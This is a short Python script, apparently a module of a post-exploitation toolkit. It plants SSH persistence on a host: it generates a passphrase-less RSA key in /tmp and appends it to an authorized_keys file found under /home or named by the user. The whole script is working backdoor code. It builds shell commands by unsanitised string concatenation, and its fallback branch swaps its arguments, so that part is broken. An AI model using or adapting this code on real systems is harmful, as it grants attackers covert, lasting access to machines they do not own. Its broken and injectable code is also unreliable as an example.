#!/usr/bin/python3
#[Access] SSH authorized_keys
#USER,no,Username to whom keys will be added
#KEY_PATH,no,Path to generated SSH key
#END
import os
import random
import string
import pathlib

def generate_ssh_key(): #Generates new ssh key and stores it in /tmp
    ssh_key_file_path = '/tmp/' + ''.join((random.choice(string.ascii_letters)) for i in range(10))
    os.system("ssh-keygen -q -t rsa -N '' -f " + ssh_key_file_path)
    
    ssh_key_file_path += ".pub"
    return ssh_key_file_path

def find_available_auth_file(): #Looks for authorized_keys in /home subdirectories
    auth_files_table = []
    for path in pathlib.Path('/home').rglob('authorized_keys'):
        auth_files_table.append(str(path.resolve()))
    if len(auth_files_table):
        return auth_files_table[0] 
    else:
        return False

def copy_key_to_auth_file(ssh_key_file_path, auth_file_path):
    os.system("cat " + ssh_key_file_path + " >> " + auth_file_path )

def main(arguments):
    if arguments[1] == "": #No custom SSH key given
        arguments[1] = generate_ssh_key()

    if arguments[0] == "": #No username given
        available_auth_file = find_available_auth_file()
        if available_auth_file:
            copy_key_to_auth_file(arguments[1], available_auth_file)
        else:
            copy_key_to_auth_file("/root/.ssh/authorized_keys", arguments[1])
    else:
        copy_key_to_auth_file(arguments[1], "/home/" + arguments[0] + "/.ssh/authorized_keys")

